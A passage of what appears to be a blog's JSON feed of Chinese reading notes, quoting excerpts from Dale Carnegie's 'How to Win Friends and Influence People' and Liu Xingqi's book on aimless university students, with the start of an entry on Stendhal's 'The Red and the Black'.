3-68</h3>\n<p>你的四周全是幻影，跳下来，不要怕。假如跌倒，恰好跌入我的怀中。</p>\n<p>甚至在地狱中，也会有短暂的几个钟头可以喘气的。</p>\n<p>小小的欢乐，悲痛与留恋 ---- 所有的一切，对于我们这些凡夫俗子来说是非常宝贵的，但是对那些人而言却太寻常了，并且不能使他们的生活变得充实。</p>\n<p>他们对于我们容忍，是由于怜悯和感激，感激我们有幸为他们效劳。之后，当它们最后感到厌恶我们时 ---- 这早晚会发生的，由于他们毕竟是人，那时候，我们再重新开始生活，可就来不及了。</p>\n",
            "tags": [
                "命运",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/22%E3%80%8A%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9%E3%80%8B%E6%88%B4%E5%B0%94%C2%B7%E5%8D%A1%E8%80%90%E5%9F%BA/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/22%E3%80%8A%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9%E3%80%8B%E6%88%B4%E5%B0%94%C2%B7%E5%8D%A1%E8%80%90%E5%9F%BA/",
            "title": "《人性的弱点》戴尔·卡耐基",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>几乎我们每个人都被贴上标签，同时也毫不留情的为别人贴标签。</p>\n<h3 id=\"3-33\"><a class=\"markdownIt-Anchor\" href=\"#3-33\">#</a> 3-33</h3>\n<p>在我衣服里面，是一颗疲惫的心，那是仁慈的，一颗不愿意伤害任何人的心。</p>\n<p>我将一生中最好的岁月给了人们，使他们获得幸福愉快，过着舒舒服服的日子，而我所得到的只是侮辱，一个遭人逮捕的人。</p>\n<p>责备人时愚蠢的事，我即使不抱怨上帝没有将智力均匀的分配，可是我对克制自己的缺陷已经感到非常吃力了。</p>\n<h3 id=\"3-34\"><a class=\"markdownIt-Anchor\" href=\"#3-34\">#</a> 3-34</h3>\n<p>人类自然的天性，是做错事只会责备别人，而不会责备自己，我们每个人都是如此。</p>\n<p>不要批评他们，我们在相同的情况下，也会像他们一样。</p>\n<p>当我们要应付一个人的时候，应该记住，我们不是应付理论的动物，而是应付感情的动物。</p>\n<p>任何一个愚蠢的人，都会批评人，斥责人和抱怨人，同时，也是绝大部分愚蠢的人才这样做的。</p>\n<p>上帝在末日之前，还不打算审判人。</p>\n<p>凡你我所做的事，都起源于两种动机，那是性的冲动和能成为伟人的欲望。</p>\n<p>人类天性中最深切的冲动，就是成为重要人物的欲望。</p>\n<p>人可能真的会发疯，为的是要在疯狂的环境中，寻找冷酷的现实世界得不到的自重感。</p>\n<p>那其他半数疯狂的人，明显的，他们脑细胞机构中没有任何病态。在他们去世后解剖检验，用最高性能的显微镜研究他们的脑细胞组织，发现他们的脑细胞，完全跟我们一样健全。</p>\n<p>许多精神错乱的人，在他疯癫中找到了真实世界中所无法获得的自重感。</p>\n<p>精神失常的人，似乎要比你我快乐。既然许多人以疯癫为快乐，他们为什么不这样呢？他们已经解决了他们的问题。</p>\n<p>一般人不喜欢一件事，会尽量的挑剔错误；如果真的喜欢，他会一句话也不说。</p>\n<p>这恭维的艺术，在这真实幽默的时代中，几乎是一件给人忘了的东西。</p>\n<p>你用任何言语所要说的，总离不开自己的种种。</p>\n<p>停止思考我们自己的成就和需要，让我们去研究别人的优点，把对人的恭维，谄媚忘掉，给予人由衷、诚恳的赞赏。人们对你所讲的，将会重视和真实，众生藏之背诵… 即使你把这件事已经忘记了很久，可是他还牢牢记住你所说的话。</p>\n<p>当然，你注意你的需要，你永远在注意，但别人对你却漠不关心。要知道，其他的人都像你一样，他们关心的只是他们自己。</p>\n<p>世界上唯一能影响对方的方法，就是谈判他所需要的，而且还告诉他，如何才能得到他。</p>\n<p>从你来到世界上的这一天开始，所做的每一举动，出发点都是自己，都是因为，你需要什么。</p>\n<h3 id=\"3-35\"><a class=\"markdownIt-Anchor\" href=\"#3-35\">#</a> 3-35</h3>\n<p>行动是由我们的基本欲望所产生的：对于未来想要说服人家的人，最好的建议，是无论在商业中、家庭中、学校中、政治中，都要先激起对方某种迫切的需要，若能做到这点就可以左右逢源，否则到处碰壁。</p>\n<p>他所关心的，不是帮助我，替我解决一个问题，最使他关心的，是能从我钱袋里得到多少钱。结果，他什么也没有得到。</p>\n<p>一个人能置身于他人境地，能了解他人意念活动，他不必考虑到将来的前途如何。</p>\n<p>表现自己，那是人生最主要的需要。</p>\n<p>对别人好，不是一种责任，是一种享受，因为它能增进你的健康和快乐。一个人希望得到人生快乐，就不能只想到自己，也应为他人着想，因为快乐来自于你为别人，别人为你。</p>\n<p>一个以自我为中心的人必定陷入对生活的抱怨之中，世界不能使他快乐。</p>\n<p>要使自己快乐只有首先让别人快乐。我发觉，快乐是有感染力的。</p>\n<p>没有时间去关注或可怜自己的疾病，忘掉自己，让我获得了有意义的新生。</p>\n<p>他们只是不知道生活的意义在哪里而已。他们以自我为中心，只关注自己。</p>\n<p>对别人好不是压力，而应该是被看成一种享受，因为它能使你健康快乐。</p>\n<p>为实现自我价值与获得快乐，付出与律己是非常必要的。</p>\n<p>一个自私自利的人，不可能走向圆满的人生。只有忘我的为他人服务，才能体会到这种乐趣。</p>\n<p>人生只是一出傻瓜说出的故事，没有任何意义。</p>\n<p>人生的平安喜乐，不是因为我们身在何处，或在做什么，或我们是谁，完全由我们的心境决定的。</p>\n<p>人的内心都有着一份神奇的力量，那就是自我…… 所有人都是自己思想的产物，人提升了自己的思想才能上进，克服并完成某些事，拒绝提升思想的人只能留在悲惨的深渊中。</p>\n<p>你所认识的，并做真正的你，反倒是你怎么想，你就是怎么样的人。</p>\n<p>任何生理上的疾病都不能与心理上的痛苦相提并论。</p>\n<p>心灵，是它自己的殿堂，它可成为地狱中的天堂，也可称为天堂中的地狱。</p>\n<p>我无法控制自己的思想，我的内心充满了恐惧，一点小小的声音都会令我惊跳起来。我逃避所有的人，无缘无故的，我就可以嚎啕大哭一场。</p>\n<h3 id=\"3-36\"><a class=\"markdownIt-Anchor\" href=\"#3-36\">#</a> 3-36</h3>\n<p>对于我来说，每一天都是煎熬，我觉得所有的人都遗弃了我。</p>\n<p>我发现自己愚不可及，认清自己后，使我吃了一惊，原来我一直想要改变的整个世界及其中的每一个人–其实，唯一需要改变的只是我的想法罢了。</p>\n<p>我现在深信，我们由人生体会到心灵的平安与喜乐，不是因为我们身在何处，或在做什么，或我们是谁，完全由我们的心理态度所决定。外界的环境实在作用有限。</p>\n<p>行动似乎在跟着感觉走，其实行动与感觉是并行的，大多都以意志控制行动，也就能间接控制感觉。也就是说，我们不能一下决心就立即改变情绪，但是我们确定可以做到改变行动。当我们改变行动的时候就自动改变感觉。</p>\n<p>不幸的根源，在于把自己套入了一个不属于自己的模式中。</p>\n<p>一个人最糟糕的是不能成为自己，不能在身心中保持自己。</p>\n<p>前来求职的人所犯的最大的错误，就是不能保持自色。他们不敢以真面目示人，不能完全坦诚，却给你一些他认为你想要的回答。</p>\n<p>人往往都是活在自己所设的限定里，我们拥有各种各样的资源，却常常不能成功的运用他们。</p>\n<p>把别人的观点大杂烩的凑在一起写成的东西非常做作，也非常枯燥。</p>\n<p>羡慕就是无知，模仿就是自杀。不论好坏，他都必须保持自己的本色。虽然广袤的宇宙之间全是美好的东西，但除非它耕耘那一块属于自己的土地，否则绝不会有好收成。</p>\n<p>一个人就是它成天所想象的那种样子，他怎么可能成为另外一种样子呢？只要你知道自己心里想什么，就可以知道你是一个怎样的人，因为每个人的性格特征都是由他的思想造成的。</p>\n<p>如果我们沉浸在自我哀怜之中，那别人都会有意躲着我们，如果我们所想的全都是失败，那我们就会失败。</p>\n<p>你并不是你想象中的那种样子，而你却会是你所想的那个人。</p>\n<h3 id=\"3-37\"><a class=\"markdownIt-Anchor\" href=\"#3-37\">#</a> 3-37</h3>\n<p>不要以为一次政治上的话获胜，收入上的提高，病体的康复，或是分手许久好友的归来，或是其他任何纯粹外在的事物，能提高你的兴致，使你觉得你的眼前有许多美好的日子。不要相信他，事情绝不会那么简单，除了你自己，没有任何东西能给你带来平静。</p>\n<p>只有具备了奋发向上的思想之后，一个人才能振奋，充满欲望，并能有所成就。</p>\n<p>通常，只要把受苦者的内心感觉由恐惧转变为奋斗，就可以把我们所谓的大部分邪恶转变为有所裨益的东西。</p>\n<p>既然你除了等死之外没有其他任何指望，那么就干脆放弃那些顾虑，去充分利用你余下的生命吧。</p>\n<p>因为忧虑的最大害处，就是会毁掉我们几种精神的能力。其实，当我们忧虑的时候，思想会到处乱转，从而丧失决策分析的能力。</p>\n<p>接受既定事实，是克服随之而来的任何不幸的第一步。</p>\n<p>因为各种看不见的忧虑，导致了沉甸甸的思想上的压力。</p>\n<p>恐惧、忧虑、怨恨、极端自私、以及无法适应现实生活，才是他们得胃病和胃溃疡的根本原因 — 胃溃疡会让你致死。</p>\n<p>医生所犯的最大错误，就是他们只为病人治疗身体，却不为他们医治思想。可是精神和肉体是一致的，不能分别治疗。</p>\n<p>焦虑和烦躁不安的人，大豆难以适应现实世界，以至于和周围的人没有沟通，把自己缩到自己的梦幻世界，一次解决其所有的忧虑。</p>\n<p>对我们来说最重要的，就是不要看远方模糊的事，而要做手边清楚的事。</p>\n<p>你有的是现在，切断过去，埋葬掉已逝的过去，切断那些会把傻瓜引导死亡之路的昨天。明天的重担加上昨天的重担会成为今天最大的障碍，要吧未来和过去都紧紧的关在门外，记住你只有今天，未来就在今天，没有明天这个东西。</p>\n<p>不管明天有多么糟糕，我已经度过了今天。</p>\n<h3 id=\"3-38\"><a class=\"markdownIt-Anchor\" href=\"#3-38\">#</a> 3-38</h3>\n<p>每个人在目前的这一瞬间，都站在两个永恒的交叉点上–这个点已经永远的过去了，并且延伸到了无穷无尽的未来。但是，我们都不可能生活在这两个永恒之中，哪怕是一秒都不行。我们要满足于目前所生活的这一刻。</p>\n<p>等退休之后，他再回头看看他所经历的一切时，似乎有一阵冷风吹过来，他错过了一切，而一切又一去不复返。我们总是无法及早学会这个道理：生命就在生活里，就在每一天和每一刻。</p>\n<p>在我的生活里，曾充满了可怕的不幸，而那些不幸以前大部分从来没有发生过，我的生活和你的生后，也都是如此。</p>\n<p>用铁门把过去和未来隔断，生活在完全独立的今天。</p>\n<p>生命就是一种毫无价值而又充满了痛苦的冒险，当他走过生命的每一刻的时候，全身似乎都散发着痛苦，可是在他绝望的深处。如果可能的话，不应该对任何人产生怨恨。</p>\n<p>我没有时间和别人吵架，也没有时间去后悔，没有任何人能强迫我将自己讲到恨他地步。</p>\n<p>不论如何，命运总会让我们为自己的过错付出代价。归根结底，每一个人都会为他所犯的错误付出代价。能够记住这点的人，就不会对任何人生气。</p>\n<p>我今天就要去见那些多嘴滑舌的人–那些自私的、以自我为中心的，丝毫不知感激的恶人。可是我对此既不吃惊，也不难过，因为我无法想象，一个没有这种人的世界将是怎么样的。</p>\n<p>如果你有足够的新鲜水喝，有足够的食物可以吃，就不要抱怨任何事情。</p>\n<p>我们很少想到自己已经拥有的，而总是想到我们所没有的。</p>\n<p>这么多年来，我们每天都生活在一个美丽的童话王国里，但我们却无所事事，并对此视而不见，吃得太饱，而不能享受生活的乐趣。</p>\n<p>快乐的大部分并不是享受，而是胜利。这种胜利来自于一种得意，一种成就感。</p>\n<p>不仅能够在必要的条件下忍受一切，而且还要喜欢这一切。</p>\n<h3 id=\"3-39\"><a class=\"markdownIt-Anchor\" href=\"#3-39\">#</a> 3-39</h3>\n<p>抱怨不能解决任何问题，只会使事情变得更糟糕。</p>\n<p>有生以来第一次，能让自己去仔细地观察这个世界，有了真正的价值观。我开始明白，我以往所追求的事情，实际上大部分一点价值都没有。</p>\n<p>忧郁症就像一个常年不知的怒气，以及对别人的方案，虽然患者只是想得到照顾、同情和支持，但是他们似乎只是因为内心的愧疚感而抑郁不乐。</p>\n<p>谈论他们那些毫无意义的、微笑的且又毫无用处的生活。当然，他们上不了船，就只好站在码头上，怪这个或怪那个，但他们绝不会怪自己，还要求全世界都以他们的欲望为中心。</p>\n<p>在现实生活中，批评是有善意的，也有为了打击你而不择手段的。</p>\n<p>一般人根本就不会想到你和我，或者注意到别人对我们的批评，人么你只会想到他们自己。他们对自己小问题的关注程度，要远远超过那些能置你或我于死地的大事上千百倍。</p>\n<p>我可以做到，在那些不公正的批评下不受到任何干扰。</p>\n<p>做你心里认为对的事，因为无论如何你也是会受到批评的。做也该死，不做也该死。</p>\n<p>我尽我所知的最好办法去做 — 也就我所能去做，而我打算一直这样把事情做完。</p>\n<p>我发现我所有的不幸与他人无任何关系，全部应该怪我自己。</p>\n<p>我们不是逻辑性的生物，而是一种感情生物。我们的逻辑就像一只独木小舟，在深不可测的情感海洋里漂泊。</p>\n<p>即使轻微的争辩，也加以避免–人类的思想不是那么容易改变的。</p>\n<p>一个科学家，永远不敢求证些什么，我只是试着寻找事实。</p>\n<p>我们有时发现自己会在毫无抵抗和阻力中，改变自己的意念。可是，如果有人告诉我们所犯的错误，我们却感到懊恼和憎恨。我们不会去注意一种意念的养成，可是当有人要抹去我们那股意念时，我们对这份意念突然坚实而固执起来。并非我们对那份意念有强烈的偏爱，而是我们的自尊受到了损伤。</p>\n<h3 id=\"3-40\"><a class=\"markdownIt-Anchor\" href=\"#3-40\">#</a> 3-40</h3>\n<p>如果有人硬把不合胃口的事实往我们的喉咙塞下去，我们是无法接受下来的。</p>\n<p>你打击跟你意见不合的人，现在已经没人理会你的意见。你知道的太多了，以致再也不会有人告诉你任何事情 — 其实，你除了现在极有限度的知识之外，不会再知道其他更多了。</p>\n<p>任何一个愚蠢的人都会尽力辩护自己的过错 — 一个能承认自己错误的人，却可使它出类拔萃，并且给人一种尊贵、高尚的感觉。</p>\n<p>用争夺的方法，永远无法得到满足。可当你谦让的时候，你可以得到比期望的更多。</p>\n<p>如果你握紧了两个拳头来找我，我可以告诉你，我的拳头握的更紧。</p>\n<p>即使是我们的朋友，也宁愿多谈论他们的成就，喜欢我们吹嘘的人，可说少之又少。</p>\n<p>当我们所猜妒的人，发生一桩不幸的事时，会使我们有一种恶意的快感。是的，有的朋友看你遭遇了困难，比看你成功或许更为满意。</p>\n<p>生命是短促的，别把我们不值一提的成就作为谈话的资本，令人听了厌烦。</p>\n<p>若与我们应当成就的事业相比，我们不过是半醒着。我们现在只利用到我们身心资源的一小部分。也可以这样说，每一个人，都这样的生活着，远在他应有的极限之内，他有各种的力量，可是却习惯于不会利用。</p>\n<p>如果你必须去对付一个盗贼、骗子，只有一个办法制服他，那就是待他如同一位诚实、体面的绅士一样，假设他是位规规矩矩的正人君子，他会感到受宠若惊，会很骄傲的认为有人信任他。</p>\n<p>有人终身的错误，就是只想到人关心他，对他发生兴趣。人们不会对任何人发生兴趣，他们早晨、中午、晚上所关心的只是他自己。</p>\n<p>要别人对我们发生兴趣时，我们先要对别人发生兴趣。</p>\n<p>行动和感受，时背道而驰的，所以你需要快乐时可以强迫自己快乐起来。快乐是出自内在的心情，不需要向外界寻求的。</p>\n<p>好与坏无从区别，那是由于每个人的想法使然。</p>\n<h3 id=\"3-41\"><a class=\"markdownIt-Anchor\" href=\"#3-41\">#</a> 3-41</h3>\n<p>事情已如此，就不再自己去找烦恼，而从自己的心底寻找快乐。</p>\n<p>只谈论自己的人，永远只为自己着想。这种人是无药可救的。无论他接受过怎么样的教育，仍然跟没有受过教育一样。</p>\n<p>做一个善于静听的人，鼓励人们多谈谈他们自己。</p>\n<p>人与动物相异之处，就在于自重感的有与无，而人类的文化也是由此引起的。</p>\n<p>你希望别人怎样待你，你就该怎样对待别人。</p>\n<p>人，骄傲的人，借着一点点短促的能力，便在上帝面前胡作非为，恣意妄为，使天使为之落泪。</p>\n<p>如果你想每天过着快乐、美满的生活，千万别指责你太太治家有不妥的地方，或者拿她和你的母亲做毫无意义的比较。</p>\n<p>他说并没有什么诡计，你只要对女人谈论她自己就行了。</p>\n<p>似乎人类思想之所以有进步，都是从怀疑、发问和挑战而来的。</p>\n<p>地狱中的魔鬼所发明的种种毁减爱情的烈火中，吵闹是最可怕的一种，就像被毒舌咬到，没有任何生还的希望。</p>\n<p>那些美丽、甜蜜的日子，现在已经成了逝去的回忆时，他们都激动的痛苦起来…… 生活的现实和逝去的回忆，那是多么的不同！</p>\n<p>跟人们交往，第一件要学的事，就是不干涉人们自己原有的那种特殊快乐的方法。</p>\n<p>婚姻的成功，那不只是寻找一个适当的人，而是自己该如何做一个适当的人。</p>\n<p>为什么许多甜蜜的美梦会在结婚以后全部触礁呢？她知道有一个原因，那就是因为毫无用途的、令人心碎的批评。</p>\n<p>他们永远注意到对方细节的地方，彼此间细微的体谅，使他们的爱情永恒。</p>\n<p>这条路，我只能经过一次，所以，凡我所为人做的任何好事，任何一点仁慈，让我现在就做吧！不要迟延、不要忽略、因为我将不会在这里经过了！</p>\n<p>那是一桩令人惊讶的事，可是完全是事实…… 对我们说出那些刻薄、侮辱、伤感情的话的人，差不多都是我们自己的家人。</p>\n<h3 id=\"3-42\"><a class=\"markdownIt-Anchor\" href=\"#3-42\">#</a> 3-42</h3>\n<p>幸福的婚姻只属于那些心灵成熟，了解自己，善于和他们建立良好的关系，而且任何事情都为他人的幸福着想的，负有责任感的人。</p>\n<p>无论是男人还是女人，婚姻并不能只靠钱来维持。衣食无忧只是男性责任的开端，而不是全部，而且事情也不完全局限于此。</p>\n<p>对于一个女人来说，比一辈子容忍男人的任性更可悲的则是没有男人可以让她去容忍。</p>\n<p>我们把婚姻中相互调适的大问题交付给机会这两个字。这样的结合不是真正的结婚，那只是尚未离婚而已，也就是让自己去受罪。</p>\n<p>在不成熟的人眼里，他们永远都可以找到一些理由，而且是外部环境的理由，通过这些来解脱他们自身的某些缺点或不幸。假如他们找不到人可以当作责怪的对象，还可以责怪多变的时代，国际形势的混乱、现代生活的不安全感，及其他耸人听闻的情况。</p>\n<p>把人的生活改造得更加美好才重要，而不是整日沉溺在自怜的深渊。</p>\n<p>在那些喜欢逃避责任的人眼里，困难就是他们最好的挡箭牌。你也许听过许多人把失败的原因归咎于没有受过大学教育。事实上，就算这些人真的接受了大学教育，他们 仍能为自己找出许多理由。</p>\n<p>人们时常抱怨自己的环境不顺利，因此使他们没有什么成就。我是不相信这种说法的。假如你得不到所要的环境，可以制造出一个来啊！</p>\n<p>智者在面对不幸时，懂得给时间一个机会。</p>\n<p>人的幸福结局，并非是平淡，安慰的喜乐，而是轰轰烈烈、并浴血奋斗。</p>\n<p>把自己的心思和精力用来帮助别人，你便不再将心思放在困扰自己的事情上。</p>\n<p>我们必须信仰某些事物，假如我们没有就此信仰去采取行动，一切仍然是徒劳无功。只有信心而没有作为，是起不到任何作用的。</p>\n<p>在当今社会，个性主义已遭到破坏，甚至已濒临死亡。无外乎我们现在对自己的独特性已愈来愈没有概念，甚至于采取与他人不同的行动也感到恐惧。</p>\n<h3 id=\"3-43\"><a class=\"markdownIt-Anchor\" href=\"#3-43\">#</a> 3-43</h3>\n<p>现实生活中，人们时常把自己深裹在习惯或习以为常的无聊事件里，在里面窒息而不自知，同时人们又难以将其破除。想想看，生活中有多少人每天都不断重复相同的行为，生命因此变得迟钝，无精打采并且一点儿创意的能力都没有。</p>\n<p>兴奋本身能染我们摆脱掉习性、厌烦和压抑，然后让我们整个人得到充分的展现。</p>\n<p>在这个充满竞争的社会，我们往往以物质上的成就来衡量人的价值，再加上名望的追求、枯燥乏味的工作，处处都能使我们的灵魂染上疾病。我还坚信，人们的精神之所以产生迷乱，就是由于普通缺乏一种有力、持续的宗教信仰的支撑。</p>\n<p>要尽可能由他人的观点来看事情，但不可因此而失去自己的观点。假如成熟能带给你什么好处的话，那便是发现自己的信念，以及无论遇到怎样的因素，都维持着实现这些信念的勇气。</p>\n<p>想追求安全感一样，人们喜欢顺应环境，最后往往使自己成为环境的奴隶。对我们来说，真正意义上的自由，应该是接受生活中的各种挑战，是要不断奋斗，并经历各种争议。</p>\n<p>坚持一项众人皆知不支持的原则，或不随便迁就一项普遍为人支持的原则，都不是件轻松的事。一个不随波逐流的人，在受攻击的时候坚持信念到底，那么就表明他具备极大的勇气。</p>\n<p>几乎我们每个人都被贴上标签，同时也毫不留情的为别人贴标签。</p>\n<p>对于言语乏味的人来说，为了使内心的空虚得以补偿，这种人会把注意力集中在一些琐事上面，并且还会对这些琐事过分关注。</p>\n<p>人类的问题不能单独研究，一定要和世界的关系连带着研究，要把小宇宙同大宇宙联系起来。</p>\n<p>自怜，实际上上是一般人的习性。</p>\n<p>人会做两件事，都有两个理由存在：一种是好听的，一种是真实的。</p>\n<p>凡你所见到的人，甚至你照镜子时所看到的那个人，都会把自己看得很高尚，他对自己的估计，都希望是良好的而不是自私的。</p>\n<h3 id=\"3-44\"><a class=\"markdownIt-Anchor\" href=\"#3-44\">#</a> 3-44</h3>\n<p>没有一样东西能在任何情况下产生同样的效果，没有一样东西能在所有人身上都发挥效力。</p>\n<p>一切和我们的个人欲望相适合的，看来都是真理，而其他一切只会使我们感到愤怒。</p>\n<p>消除忧虑的最好办法，就是做一些有意义的事情，让自己一直忙着。</p>\n<p>人们之所以忧虑，就是有空闲时间来想想自己到底快不快乐。</p>\n<p>我们可以把它们不可避免的情况而加以接受，并且适应它，或者我们可以用忧虑来摧毁自己的生活，甚至最后把自己搞到精神崩溃。</p>\n<p>快乐的源泉，就是不要为我们的意志力所不能及的事忧虑。</p>\n<p>让已经过去的错误产生价值的唯一方法，就是平静地分析我们过去的错误，并从错误中吸取教训，然后再彻底把错误忘记。</p>\n<p>一个人若不能与同伴的脚步一致，也许是由于他听到不同的鼓声。何妨就让他随着他所听到的音乐前进，不论节奏如何或多遥远。</p>\n<p>我尽自己所知的做好，尽我最大的能力，而且我的意思是继续这样做，直到最后。如果最后证明我是对的，那么那些反对我的话都无关紧要。如果最后证明我是错了，那么就会有十位天使誓言我是对的，这样便没有区别。</p>\n<p>依你的身材剪裁的衣服，纵然不像为别的身材的人剪裁的衣服那般华丽，却要合适的多了。</p>\n<p>就在你的世界里，才能找到你自己。</p>\n<p>只要我以责任和信念为出发点来行动，我就不在乎嘲讽和讥评。</p>\n<p>映照在贫民院窗户上的落日，与映照在富人屋宇上的，是一样的灿烂。</p>\n<p>行动不一定带来快乐，但是无行动则决无快乐。</p>\n<p>不，工作不是一种道德上的责任，不是以错误而过时的，清教徒的道德观加在我们身上，它是人类至深的欲望表现，希望自己的生命的时日能有意义。</p>\n<h3 id=\"3-45\"><a class=\"markdownIt-Anchor\" href=\"#3-45\">#</a> 3-45</h3>\n<p>一个人最好的东西在最靠近他的地方，就近在他的脚边。</p>\n<p>除了我自己以外，没有人能伤害我。我忍耐着伤害，除非是自己的过错，永远不会真正受害。</p>\n<p>信仰是去相信我们所未看见的，而这种信仰的回报，是看我们所相信的。</p>\n<p>我们所渴望的并珍惜的勇气，并非要尊贵的死去，而是要果敢的活下来。</p>\n",
            "tags": [
                "人生",
                "成长"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/29%E3%80%8A%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%9A%84%E5%9D%9F%E3%80%8B%E5%88%98%E5%85%B4%E5%A5%87/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/29%E3%80%8A%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%9A%84%E5%9D%9F%E3%80%8B%E5%88%98%E5%85%B4%E5%A5%87/",
            "title": "《大学生的坟》刘兴奇",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>” 别用你的逻辑来理解我的逻辑。你的逻辑是，因为你不行，所以你不做。我的逻辑是，因为我不行，所以我才做。也许会失败，但是失败之后就慢慢成功了 “。</p>\n<h3 id=\"03-70\"><a class=\"markdownIt-Anchor\" href=\"#03-70\">#</a> 03-70</h3>\n<p>如今大学校园里有着太多颓废的大学生，他们那颓废的生活方式、糜烂的精神世界，狭隘的人生格局、迂腐的思想观念。两眼呆滞一脸死相、活生生的 “考试机器”，很多人也有着无法改变的迂腐观念。</p>\n<p>因为迷茫而看不到出路，就像是晚上走路看不清下一步的落脚点。</p>\n<p>“你什么都可以没有，但不能没有进取心 “。</p>\n<p>很多人都死在了家庭，学校和父母过于强烈的保护意识之下。提倡独立，但永远有人帮你代劳过了；提倡思考，但永远有人帮你思考过了。</p>\n<p>很多人稀里糊涂的就当了父母，然后用无知的方式培养了一个又一个草包。</p>\n<h3 id=\"03-71\"><a class=\"markdownIt-Anchor\" href=\"#03-71\">#</a> 03-71</h3>\n<p>我看到了原本老实巴交不善于应酬的爸爸满脸堆着不自在的笑容在小心翼翼的附和着那帮” 恩人 “，我能深深的感到我爸爸的自卑与不自在。很多人可能没有这种感觉，因为他们很早就已经习惯了一切，所以他们失去了一切有冲击力的东西。</p>\n<p>人与人的差别很多时候不在于成绩高低和证书多少，承受力至关重要。</p>\n<p>爱情这东西不能这么功利，也不能因为无聊、空虚、寂寞而谈恋爱（很多人都会因此谈恋爱），因为我们都知道，有时候爱情不仅不能救命，而且会让一些人毙命。</p>\n<p>” 别用你的逻辑来理解我的逻辑。你的逻辑是，因为你不行，所以你不做。我的逻辑是，因为我不行，所以我才做。也许会失败，但是失败之后就慢慢成功了 “。</p>\n<p>一个害怕失败的人，永远都是失败的，因为他本来就躺在那里，虽然不会再有躺下的可能，但永远也不会成功。</p>\n<p>于是我像现在大部分学生一样，经常一个人去自习，经常拿着英语单词书反复死背，这是大多数迷茫者共同的毛病，并且我跟大多数迷茫但不自知者一样，觉得这是最能让我心安且上进的方式。直至多年之后我才发现，其实很多种努力方式，都比反复背单词强的多。</p>\n<p>我们身边的大部分人都不具备参考价值。因为他们的知识面、思想境界、迷茫程度都和你差不多，甚至更多的时候他们还不如你。如果你看他们人多就跟了他们，那就是典型的羊群效应。</p>\n<p>你在大学是什么德行，跟高中无关，因为他们是两个不同的评判体系；你在社会上是什么德行，与你的大学也关系不大，因为他们也是不同的。</p>\n<p>可怜的英语成了寂寞和迷茫的发泄工具，那些寂寞的人喊完英语回来，感觉很充实，然后带着那些尚在寂寞的人一起去喊英语去充实，于是英语就真的充实起来了。</p>\n<h3 id=\"3-72\"><a class=\"markdownIt-Anchor\" href=\"#3-72\">#</a> 3-72</h3>\n<p>这个世界上，有思想的人就那么多，大部分都是捡样的。</p>\n<p>一伙没有目标的人，在跟着别人学英语；一堆失去自我的人，在陪着别人学英语；一群有脑袋没思想的人，在用英语安慰自己空虚迷茫的心灵。</p>\n<p>很多人都陷入到了一种怪圈里，他们从来不问什么，也不管自己是否需要，他们只会考，一直考的没的考为之。</p>\n<p>你享受的免费，其实是有人给你买了单，或者是你那即将要买单的前兆。</p>\n<p>一些人在学生会待了一段时间之后，就真的变得官僚作风了，比如做事拖沓、喜欢讲究程序，开会废话连篇、官话太多，不讲效率。</p>\n<p>寂寞太深，月下散步就以为胜却人间烟火了。</p>\n<p>大学生谈恋爱，更多的是一个堕落加另一个堕落等于双重堕落。</p>\n<p>为了实现一个目标而努力，是一件非常可喜可贺的事情，但前提条件是，这个为之努力的东西必须是一个正确的东西。否则越是努力，离成功越远，南辕北辙就是这个意思。</p>\n<p>活着和死了一样，轻轻地来，低调地走。任你怎么刺激，他都无动于衷；任你怎么挑剔，他都平静如水。没有信念，仿佛 20 多岁就等死了。</p>\n<p>总是有那么一大群无知的、颓废的、堕落的人对你的行为指指点点，面对这些，你也许会反驳他们。但更多时候，你会选择退缩，沦为平庸，因为这个世界上，庸人的力量太强大了。</p>\n<p>社会同化的规律就是，只要你跟他们有一点点不一样，他们就会把你拉回来。而不被 “燕雀” 影响的最好办法是，不要告诉他们，也不要跟他们解释，因为你要让一头猪明白你的思想，还不如节省点时间让自己变成一个牛人。</p>\n<p>因为有希望，所以他们还活着。</p>\n<h3 id=\"3-73\"><a class=\"markdownIt-Anchor\" href=\"#3-73\">#</a> 3-73</h3>\n<p>“希望” 是不会发生在这类没思想、没行动、没目标、没计划的人身上，对这类人而言，明天就是今天，明年就是今年。</p>\n<p>因为没有行动的希望，就是做梦。</p>\n<p>就教学质量而言，大学教学内容陈旧，与现实脱节。很多大学生教师依然用五年前的东西来教今天的学生。这样，学生没出门就落伍了，因为教他的老师早就落伍了。</p>\n<p>我们只能天天趴在教室里忍受孤独和寂寞，只能用时间和经验去换取只会，只能疲劳的驾着马车不停的追赶那坐车飞机先行的人。</p>\n<p>一个真正聪明的人，不仅知道自己要做什么，而且知道自己不要做什么。</p>\n<p>无数的大学生只不过是在混一张文凭而已，而且还自欺欺人的以为这张文凭会给自己带来一份不错的工作和 “钱途”。事实上，那张文凭出了证明你在大学待了四年，什么也证明不了。</p>\n<p>大学里的爱情基本上没有任何附加条件，只要还是个人，彼此看着还顺眼，双方就可以纯洁地爱，死去活来地爱。其实，很多时候，爱情本身就有问题，因为寂寞在一起了，随着寂寞的解除爱也不在了。当爱情带上现实的镣铐的时候，一切都没那么美好了。</p>\n<p>光努力是不够的，要会努力才行。</p>\n",
            "tags": [
                "成长",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/32%E3%80%8A%E7%BA%A2%E4%B8%8E%E9%BB%91%E3%80%8B%E6%96%AF%E5%BD%93%E8%BE%BE/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/32%E3%80%8A%E7%BA%A2%E4%B8%8E%E9%BB%91%E3%80%8B%E6%96%AF%E5%BD%93%E8%BE%BE/",
            "title": "《红与黑》斯当达",
            "date_published": "2019-06-30T16:00:00.000Z",
